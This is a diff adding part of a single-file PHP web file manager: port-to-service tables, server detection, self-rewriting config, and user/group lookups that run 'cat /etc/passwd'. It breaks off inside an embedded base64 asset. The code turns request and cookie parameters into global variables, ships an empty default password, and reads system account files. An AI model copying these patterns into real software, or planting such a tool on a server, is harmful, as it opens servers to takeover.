+		$services['22'] = "SSH";
+		$services['23'] = "TELNET";
+		$services['25'] = "SMTP";
+		//$services['53:UDP'] = "DNS";
+		//$services['67:UDP'] = "DHCP";
+		//$services['68:UDP'] = "BOOTP";
+		//$services['69:UDP'] = "TFTP";
+		$services['80'] = "HTTPD";
+		$services['110'] = "POP3";
+		//$services['123:UDP'] = "NTP";
+		//$services['137:UDP'] = "NETBIOS-NS";
+		//$services['138:UDP'] = "NETBIOS-DATA";
+		$services['139'] = "NETBIOS-SESSION";
+		$services['143'] = "IMAP";
+		$services['161'] = "SNMP";
+		$services['389'] = "LDAP";
+		$services['445'] = "SMB-AD";
+		//$services['445:UDP'] = "SMB-FS";
+		$services['465'] = "SMTPS-SSL";
+		$services['512'] = "RPC";
+		$services['514'] = "RSH";
+		//$services['514:UDP'] = "SYSLOG";
+		$services['515'] = "LPD-PRINTER";
+		//$services['520:UDP'] = "RIP-ROUTER";
+		$services['530'] = "RPC";
+		$services['540'] = "UUCP";
+		$services['544'] = "KSHELL";
+		$services['556'] = "REMOTE-FS";
+		$services['587'] = "SMTPS-TLS";
+		$services['593'] = "HTTP-RPC";
+		$services['631'] = "IPP";
+		$services['636'] = "LDAPS";
+		$services['993'] = "IMAPS";
+		$services['995'] = "POP3S";
+		$services['990'] = "FTPS";
+		$services['992'] = "TELNETS";
+		$services['1433'] = "MSSQL";
+		$services['1521'] = "ORACLE";
+		$services['3306'] = "MYSQL/MARIADB";
+		$services['3389'] = "RDESKTOP";
+		$services['5900'] = "VNC";
+		$services['7778'] = "KLOXO-ADMIN";
+		$services['8080'] = "HTTPD-ALT";
+		$services['8200'] = "GOTOMYPC";
+		$services['10000'] = "VIRTUALMIN-ADMIN";
+		$services['27017'] = "MONGODB";
+		$services['50000'] = "DB2";
+		// +--------------------------------------------------
+		// | Header and Globals
+		// +--------------------------------------------------
+		@ob_start(); // For ChromePhp Debug and JSONRPC to Work!
+		function getmicrotime(){
+		   list($usec, $sec) = explode(" ", microtime());
+		   return ((float)$usec + (float)$sec);
+		}
+		$script_init_time = getmicrotime();
+		function log_script_time(){
+			global $script_init_time;
+			fb_log(number_format((getmicrotime()-$script_init_time), 3, '.', '')."s");
+		}
+		$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
+		$max_php_recursion_counter = 0;
+		if(!isset($_SERVER['PATH_INFO']) && isset($_SERVER["ORIG_PATH_INFO"])) {
+			$_SERVER["PATH_INFO"] = $_SERVER["ORIG_PATH_INFO"];
+		}
+		function fix_directory_separator($str){
+			global $is_windows;
+			if ($is_windows) $str = str_replace('/',DIRECTORY_SEPARATOR,$str);
+			else $str = str_replace('\\',DIRECTORY_SEPARATOR,$str);
+			return $str;
+		}
+		if(!isset($_SERVER['DOCUMENT_ROOT'])) {
+			if (isset($_SERVER['SCRIPT_FILENAME'])) $path = $_SERVER['SCRIPT_FILENAME'];
+			elseif (isset($_SERVER['PATH_TRANSLATED'])) $path = str_replace('\\\\', '\\', $_SERVER['PATH_TRANSLATED']);
+			$_SERVER['DOCUMENT_ROOT'] = substr($path, 0, 0-strlen($_SERVER['PHP_SELF']));
+		}
+		$_SERVER['DOCUMENT_ROOT'] = fix_directory_separator($_SERVER['DOCUMENT_ROOT']);
+		if (@get_magic_quotes_gpc()) {
+			function stripslashes_deep($value){
+				return is_array($value)? array_map('stripslashes_deep', $value):$value;
+			}
+			$_POST = array_map('stripslashes_deep', $_POST);
+			$_GET = array_map('stripslashes_deep', $_GET);
+			$_COOKIE = array_map('stripslashes_deep', $_COOKIE);
+		}
+		// Register Globals (its an old script..)
+		$blockKeys = array('_SERVER','_SESSION','_GET','_POST','_COOKIE');
+		foreach ($_GET as $key => $val) if (array_search($key,$blockKeys) === false) $$key=$val;
+		foreach ($_POST as $key => $val) if (array_search($key,$blockKeys) === false) $$key=$val;
+		foreach ($_COOKIE as $key => $val) if (array_search($key,$blockKeys) === false && $key != 'fm_current_dir' && $key != 'ace_wrap') $$key=$val;
+		// PHP_VERSION_ID is available as of PHP 5.2.7, if our version is lower than that, then emulate it
+		if (!defined('PHP_VERSION_ID')) {
+			$php_version = explode('.', PHP_VERSION);
+			define('PHP_VERSION_ID', ($php_version[0] * 10000 + $php_version[1] * 100 + $php_version[2]));
+			if (PHP_VERSION_ID < 50207) {
+				define('PHP_MAJOR_VERSION',   $php_version[0]);
+				define('PHP_MINOR_VERSION',   $php_version[1]);
+				define('PHP_RELEASE_VERSION', $php_version[2]);
+			}
+		}
+		// Server Vars
+		function curl_server_online_check(){
+			if (function_exists('curl_init')){
+				@$ch = curl_init();
+				curl_setopt($ch, CURLOPT_URL, "http://phpfm.sf.net");
+				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+				curl_setopt($ch, CURLOPT_HEADER, 0);
+				@curl_exec($ch);
+				$errnum = curl_errno($ch);
+				@curl_close($ch);
+			}
+			return ($errnum == "0");
+		}
+		function socket_get_lan_ip($dest='64.0.0.0', $port=80) {
+			$addr = '';
+			if (function_exists('socket_create')){
+				$socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+				socket_connect($socket, $dest, $port);
+				socket_getsockname($socket, $addr, $port);
+				socket_close($socket);
+			}
+			return $addr;
+		}
+		function get_client_ip() {
+			$ipaddress = '';
+			if ($_SERVER['HTTP_CLIENT_IP']) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+			else if($_SERVER['HTTP_X_FORWARDED_FOR']) $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
+			else if($_SERVER['HTTP_X_FORWARDED']) $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+			else if($_SERVER['HTTP_FORWARDED_FOR']) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+			else if($_SERVER['HTTP_FORWARDED']) $ipaddress = $_SERVER['HTTP_FORWARDED'];
+			else if($_SERVER['HTTP_X_REAL_IP']) $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
+			else if($_SERVER['REMOTE_ADDR']) $ipaddress = $_SERVER['REMOTE_ADDR'];
+			// proxy transparente não esconde o IP local, colocando ele após o IP da rede, separado por vírgula
+			if (strpos($ipaddress, ',') !== false) {
+				$ips = explode(',', $ipaddress);
+				$ipaddress = trim($ips[0]);
+			}
+			if ($ipaddress == '::1' || $ipaddress == '127.0.0.1') $ipaddress = 'localhost';
+			return $ipaddress;
+		}
+		$ip = @get_client_ip();
+		$lan_ip = @socket_get_lan_ip();
+		function getServerURL() {
+			$url = (lowercase($_SERVER["HTTPS"]) == "on")?"https://":"http://";
+			if (strlen($_SERVER["SERVER_NAME"])) $url .= $_SERVER["SERVER_NAME"];
+			elseif (strlen($_SERVER["HTTP_HOST"])) $url .= $_SERVER["HTTP_HOST"];
+			if ($_SERVER["SERVER_PORT"] != "80" && $_SERVER["SERVER_PORT"] != "443") $url .= ":".$_SERVER["SERVER_PORT"];
+			return $url;
+		}
+		function getCompleteURL() {
+			return getServerURL().$_SERVER["REQUEST_URI"];
+		}
+		$url = @getCompleteURL();
+		$url_info = parse_url($url);
+		$doc_root = rtrim($_SERVER["DOCUMENT_ROOT"],DIRECTORY_SEPARATOR); // ex: 'C:/htdocs'
+		$url_root = rtrim(@getServerURL(),'/'); // ex. 'http://www.site.com'
+		$fm_file = __FILE__;
+		$fm_url = $url_root.$_SERVER["PHP_SELF"];
+		$fm_path_info = pathinfo($fm_file);
+		$open_basedir_ini = trim(@ini_get("open_basedir"));
+		$open_basedirs = array();
+		if (strlen($open_basedir_ini)) {
+			$dirs = array($open_basedir_ini);
+			if ($is_windows) {
+				if (strpos($open_basedir_ini,';') !== false) {
+					$dirs = explode(';',$open_basedir_ini);
+				}
+				$dirs = array_map('ucfirst',$dirs);
+			} else {
+				if (strpos($open_basedir_ini,':') !== false) {
+					$dirs = explode(':',$open_basedir_ini);
+				}
+			}
+			foreach ($dirs as $dir) {
+				$dir = rtrim($dir,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR; // fm_root must have trailing slash
+				if (is_dir($dir)) $open_basedirs[] = $dir;
+			}
+		}
+		$sys_lang = strtolower(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));
+		if (!function_exists('mb_strtoupper')) {
+			die('PHP File Manager<br>Error: Please enable "mbstring" php module.');
+		}
+		// +--------------------------------------------------
+		// | Config Class
+		// +--------------------------------------------------
+		function object_to_array( $var ) {
+			if( !is_object( $var ) && !is_array( $var ) ) {
+				return $var;
+			}
+			if( is_object( $var ) ) {
+				$var = get_object_vars( $var );
+			}
+			return array_map( 'object_to_array', $var );
+		}
+		function array_to_object( $var ) {
+			if( !is_object( $var ) && !is_array( $var ) ) {
+				return $var;
+			}
+			$obj = new stdClass();
+			foreach ($var as $key => $value) {
+				if (strlen($key)) $obj->{$key} = array_to_object( $value );
+			}
+			return $obj;
+		}
+		class config {
+			var $data;
+			function __construct(){
+				$this->data = array(
+					'lang'=>'',
+					'fm_root'=>'',
+					'timezone'=>'',
+					'date_format'=>'Y/m/d H:i',
+					'auth_pass'=>md5(''),
+					'error_reporting'=>1
+				);
+			}
+			function save(){
+				global $fm_file;
+				$config_string = "<?php".chr(13).chr(10)."//".json_encode($this->data).chr(13).chr(10);
+				if (is_file($fm_file)){
+					$lines = file($fm_file);
+					$script_start_line = 1;
+					if (strpos($lines[0],'<?php') === 0 && strpos($lines[1],'//{"') === 0) $script_start_line = 2;
+					if ($fh = @fopen($fm_file, "w")){
+						@fputs($fh,$config_string,strlen($config_string));
+						for ($x=$script_start_line;$x<count($lines);$x++) @fputs($fh,$lines[$x],strlen($lines[$x]));
+						@fclose($fh);
+					}
+				}
+			}
+			function load(){
+				global $fm_file;
+				$data = false;
+				if (is_file($fm_file)){
+					$fh = fopen($fm_file, 'r');
+					$line1 = fgets($fh);
+					$line2 = fgets($fh);
+					$line3 = fgets($fh);
+					fclose($fh);
+					if (strpos($line1,'<?php') === 0 && strpos($line2,'//{"') === 0){
+						$config_string = trim(substr($line2,2));
+						if (strlen($config_string)) $data = object_to_array(json_decode($config_string));
+					}
+				}
+				if (is_array($data) && count($data)) $this->data = $data;
+				foreach ($this->data as $key => $val) $GLOBALS[$key] = $val;
+			}
+		}
+		// +--------------------------------------------------
+		// | Config Load
+		// +--------------------------------------------------
+		$cfg = new config();
+		$cfg->load();
+		if (strlen($timezone)) @date_default_timezone_set($timezone);
+		//@setlocale(LC_CTYPE, 'C');
+		//@ini_set('default_charset', $charset);
+		@mb_internal_encoding($charset);
+		@ini_set('mbstring.substitute_character','none'); // That will strip invalid characters from UTF-8 strings
+		@ini_set("allow_url_fopen",1);
+		@error_reporting(0);
+		@ini_set("display_errors",0);
+		if ($error_reporting > 0){
+			error_reporting(E_ERROR | E_PARSE | E_COMPILE_ERROR); @ini_set("display_errors",1);
+		}
+		function fb_log(){
+			global $error_reporting;
+			if ($error_reporting < 2) return;
+			if (!class_exists('ChromePhp')) return;
+			$arguments = func_get_args();
+			if (func_num_args() > 1 && is_string($arguments[0])) {
+				ChromePhp::log($arguments[0].': ',$arguments[1]);
+			} else {
+				ChromePhp::log($arguments[0]);
+			}
+		}
+		if (!strlen($fm_current_root)) {
+			if ($is_windows) {
+				if (strpos($doc_root,":") !== false) $fm_current_root = ucfirst(substr($doc_root,0,strpos($doc_root,":")+1).DIRECTORY_SEPARATOR); // If doc_root has ":" take the drive letter
+				$fm_current_root = ucfirst($doc_root.DIRECTORY_SEPARATOR);
+			} else {
+				$fm_current_root = "/"; // Linux default show root
+			}
+		} else {
+			if ($is_windows) $fm_current_root = ucfirst($fm_current_root);
+		}
+		if (strlen($fm_root)){
+			$fm_current_root = $fm_root;
+		}
+		if (count($open_basedirs)){
+			$fm_current_root_ok = false;
+			foreach ($open_basedirs as $open_basedir) {
+				if (strpos($fm_current_root,$open_basedir) !== false) {
+					$fm_current_root_ok = true;
+					break;
+				}
+			}
+			if (!$fm_current_root_ok) {
+				$fm_path = rtrim($fm_path_info["dirname"],DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+				foreach ($open_basedirs as $open_basedir) {
+					if (strpos($fm_path,$open_basedir) !== false) {
+						$fm_current_root = $open_basedir;
+						$fm_current_root_ok = true;
+						break;
+					}
+				}
+			}
+			if (!$fm_current_root_ok){
+				$fm_current_root = $open_basedirs[0];
+			}
+		}
+		if (!isset($fm_current_dir)){
+			$fm_path = rtrim($fm_path_info["dirname"],DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+			if (strpos($fm_path,$fm_current_root) !== false) {
+				$fm_current_dir = $fm_path;
+			} else {
+				$fm_current_dir = $fm_current_root;
+			}
+			if ($is_windows) $fm_current_dir = ucfirst($fm_current_dir);
+			if (strlen($_COOKIE['fm_current_dir'])) {
+				$fm_current_dir = $_COOKIE['fm_current_dir'];
+			}
+		}
+		$fm_current_root = rtrim($fm_current_root,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+		$fm_current_dir = rtrim($fm_current_dir,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
+		//fb_log('fm_root',$fm_root);
+		//fb_log('fm_current_root',$fm_current_root);
+		//fb_log('fm_current_dir',$fm_current_dir);
+		if (isset($set_resolve_ids)){
+			$resolve_ids=intval($set_resolve_ids);
+			setcookie("resolve_ids", $resolve_ids, time()+$cookie_cache_time, "/");
+		}
+		// +--------------------------------------------------
+		// | User/Group Functions
+		// +--------------------------------------------------
+		$passwd_array = false;
+		function get_user_name($uid) {
+			global $is_windows, $passwd_array;
+			if ($is_windows) return $uid;
+			if ($passwd_array === false){
+				@system_exec_cmd("cat /etc/passwd",$passwd_file);
+				$passwd_array = explode(chr(10),$passwd_file);
+			}
+			foreach ($passwd_array as $line) {
+				$mat = explode(":",$line);
+				if ($mat[2] == $uid){
+					return $mat[0];
+				}
+			}
+			if (function_exists('posix_getpwuid')) {
+				$info = posix_getpwuid($uid);
+				return $info['name'];
+			}
+			return $uid;
+		}
+		$group_array = false;
+		function get_group_name($gid) {
+			global $is_windows, $group_array;
+			if ($is_windows) return $gid;
+			if ($group_array === false){
+				@system_exec_cmd("cat /etc/group",$group_file);
+				$group_array = explode(chr(10),$group_file);
+			}
+			foreach ($group_array as $line) {
+				$mat = explode(":",$line);
+				if ($mat[2] == $gid){
+					return $mat[0];
+				}
+			}
+			if (function_exists('posix_getgrgid')) {
+				$info = posix_getgrgid($gid);
+				return $info['name'];
+			}
+			return $gid;
+		}
+		function get_user_groups($user_name) {
+			global $is_windows, $group_array;
+			if ($is_windows) return array();
+			if ($group_array === false){
+				@system_exec_cmd("cat /etc/group",$group_file);
+				$group_array = explode(chr(10),$group_file);
+			}
+			$resul = array();
+			$resul['ids'] = array();
+			$resul['names'] = array();
+			foreach ($group_array as $line) {
+				$mat = explode(":",$line);
+				$user_names = explode(",",$mat[3]);
+				if (array_search($user_name,$user_names) !== false){
+					$resul['ids'][] = $mat[2];
+					$resul['names'][] = $mat[0];
+				}
+			}
+			return $resul;
+		}
+		function is_rwx_phpfm($file,$what='r'){
+			global $is_windows;
+			// Note: You can only change the uid/euid of the current process when one of the two is currently set to 0 (root).
+			// groupadd gteste
+			// usermod -a -G gteste www-data
+			// gpasswd -d www-data gteste
+			if (!is_array($GLOBALS['script_info'])) {
+				$GLOBALS['script_info'] = array();
+				$GLOBALS['script_info']['sys_uname'] = function_exists('posix_uname') ? @posix_uname() : '';
+				$GLOBALS['script_info']['sys_hostname'] = function_exists('gethostname') ? @gethostname() : '';
+				if (!strlen($GLOBALS['script_info']['sys_hostname'])){
+					$GLOBALS['script_info']['sys_hostname'] = @getenv('COMPUTERNAME');
+				}
+				$GLOBALS['script_info']['script_user_id'] = function_exists('posix_getuid') ? @posix_getuid() : '';
+				$GLOBALS['script_info']['script_user_name'] = $GLOBALS['script_info']['script_user_id'];
+				$GLOBALS['script_info']['script_user_home'] = '';
+				$GLOBALS['script_info']['script_user_shell'] = '';
+				$GLOBALS['script_info']['script_user_group_id'] = '';
+				$GLOBALS['script_info']['script_user_group_name'] = '';
+				$GLOBALS['script_info']['script_user_group_ids'] = array();
+				$GLOBALS['script_info']['script_user_group_names'] = array();
+				$GLOBALS['script_info']['script_group_id'] = function_exists('posix_getgid') ? @posix_getgid() : '';
+				$GLOBALS['script_info']['script_group_name'] = $GLOBALS['script_info']['script_group_id'];
+				$GLOBALS['script_info']['script_group_members'] = '';
+				if ($GLOBALS['script_info']['script_user_id'] && function_exists('posix_getpwuid')) {
+					$info = posix_getpwuid($GLOBALS['script_info']['script_user_id']);
+					$GLOBALS['script_info']['script_user_home'] = $info['dir'];
+					$GLOBALS['script_info']['script_user_shell'] = $info['shell'];
+					$GLOBALS['script_info']['script_user_name'] = $info['name'];
+					$GLOBALS['script_info']['script_user_group_id'] = $info['gid'];
+					if (function_exists('posix_getgrgid')) {
+						$info = posix_getgrgid($GLOBALS['script_info']['script_user_group_id']);
+						$GLOBALS['script_info']['script_user_group_name'] = $info['name'];
+					}
+					$info = get_user_groups($GLOBALS['script_info']['script_user_name']);
+					$GLOBALS['script_info']['script_user_group_ids'] = $info['ids'];
+					$GLOBALS['script_info']['script_user_group_names'] = $info['names'];
+					array_unshift($GLOBALS['script_info']['script_user_group_ids'], $GLOBALS['script_info']['script_user_group_id']);
+					array_unshift($GLOBALS['script_info']['script_user_group_names'], $GLOBALS['script_info']['script_user_group_name']);
+		
+				}
+				if (!strlen($GLOBALS['script_info']['script_user_name'])) {
+					if (!system_exec_cmd('whoami',$GLOBALS['script_info']['script_user_name'])) {
+						$GLOBALS['script_info']['script_user_name'] = '';
+					}
+				}
+				if (!strlen($GLOBALS['script_info']['script_user_name']) && function_exists('get_current_user')) {
+					$GLOBALS['script_info']['script_user_name'] = get_current_user();
+				}
+				if (!strlen($GLOBALS['script_info']['script_user_name'])){
+					$GLOBALS['script_info']['script_user_name'] = @getenv('USERNAME') ? : @getenv('USER');
+				}
+				if ($is_windows && strpos($GLOBALS['script_info']['script_user_name'],'\\') !== false){
+					$GLOBALS['script_info']['script_user_name'] = ucfirst(substr($GLOBALS['script_info']['script_user_name'],strpos($GLOBALS['script_info']['script_user_name'],'\\')+1));
+				}
+				if (function_exists('posix_getgrgid')) {
+					$info = posix_getgrgid($GLOBALS['script_info']['script_group_id']);
+					$GLOBALS['script_info']['script_group_name'] = $info['name'];
+					$GLOBALS['script_info']['script_group_members'] = $info['members'];
+				}
+				fb_log($GLOBALS['script_info']);
+			}
+			$file_info = array();
+			$file_info['name'] = $file;
+			$file_stat = stat($file);
+			$file_info['nlinks'] = $file_stat['nlink'];
+			$file_info['perms'] = fileperms($file);
+			$file_info['owner'] = fileowner($file);
+			$file_info['group'] = filegroup($file);
+			$file_info['is_owner_readable'] = ($file_info['perms'] & 0x0100);
+			$file_info['is_group_readable'] = ($file_info['perms'] & 0x0020);
+			$file_info['is_world_readable'] = ($file_info['perms'] & 0x0004);
+			$file_info['is_readable'] = false;
+			if ($file_info['is_world_readable']) {
+				$file_info['is_readable'] = true;
+			}
+			if ($file_info['is_group_readable']) {
+				foreach ($GLOBALS['script_info']['script_user_group_ids'] as $gid) {
+					if ($file_info['group'] == $gid) {
+						$file_info['is_readable'] = true;
+						break;
+					}
+				}
+			}
+			if ($file_info['is_owner_readable'] && $file_info['owner'] == $GLOBALS['script_info']['script_user_id']) {
+				$file_info['is_readable'] = true;
+			}
+			$file_info['is_owner_writable'] = ($file_info['perms'] & 0x0080);
+			$file_info['is_group_writable'] = ($file_info['perms'] & 0x0010);
+			$file_info['is_world_writable'] = ($file_info['perms'] & 0x0002);
+			$file_info['is_writable'] = false;
+			if ($file_info['is_world_writable']) {
+				$file_info['is_writable'] = true;
+			}
+			if ($file_info['is_group_writable']) {
+				foreach ($GLOBALS['script_info']['script_user_group_ids'] as $gid) {
+					if ($file_info['group'] == $gid) {
+						$file_info['is_writable'] = true;
+						break;
+					}
+				}
+			}
+			if ($file_info['is_owner_writable'] && $file_info['owner'] == $GLOBALS['script_info']['script_user_id']) {
+				$file_info['is_writable'] = true;
+			}
+			$file_info['is_owner_executable'] = ($file_info['perms'] & 0x0040);
+			$file_info['is_group_executable'] = ($file_info['perms'] & 0x0400);
+			$file_info['is_world_executable'] = ($file_info['perms'] & 0x0001);
+			$file_info['is_executable'] = false;
+			if ($file_info['is_world_executable']) {
+				$file_info['is_executable'] = true;
+			}
+			if ($file_info['is_group_executable']) {
+				foreach ($GLOBALS['script_info']['script_user_group_ids'] as $gid) {
+					if ($file_info['group'] == $gid) {
+						$file_info['is_executable'] = true;
+						break;
+					}
+				}
+			}
+			if ($file_info['is_owner_executable'] && $file_info['owner'] == $GLOBALS['script_info']['script_user_id']) {
+				$file_info['is_executable'] = true;
+			}
+			if ($what == 'r') return $file_info['is_readable'];
+			if ($what == 'w') return $file_info['is_writable'];
+			if ($what == 'x') return $file_info['is_executable'];
+			return false;
+		}
+		function is_readable_phpfm($file){
+			return is_rwx_phpfm($file,'r');
+		}
+		function is_writable_phpfm($file){
+			return is_rwx_phpfm($file,'w');
+		}
+		function is_executable_phpfm($file){
+			return is_rwx_phpfm($file,'x');
+		}
+		// +--------------------------------------------------
+		// | BASE64 FILES
+		// | So that PHP File Manager can remain a single file script,
+		// | and still work normally on offline enviroments
+		// +--------------------------------------------------
+		if(!function_exists('apache_request_headers')){
+			function apache_request_headers(){
+				$arh = array();
+				$rx_http = '/\AHTTP_/';
+				foreach($SERVER as $key => $val) {
+					if( preg_match($rx_http, $key) ) {
+						$arh_key = preg_replace($rx_http, '', $key);
+						$rx_matches = array();
+						// do some nasty string manipulations to restore the original letter case
+						// this should work in most cases
+						$rx_matches = explode('', $arh_key);
+						if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
+							foreach($rx_matches as $ak_key => $ak_val) {
+								$rx_matches[$ak_key] = ucfirst($ak_val);
+							}
+							$arh_key = implode('-', $rx_matches);
+						}
+						$arh[$arh_key] = $val;
+					}
+				}
+				return $arh;
+			}
+		}
+		function get_base64_file(){
+			global $filename,$fm_path_info;
+			// +--------------------------------------------------
+			$base64_files = array();
+			$base64_files['32px.png'] = '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';
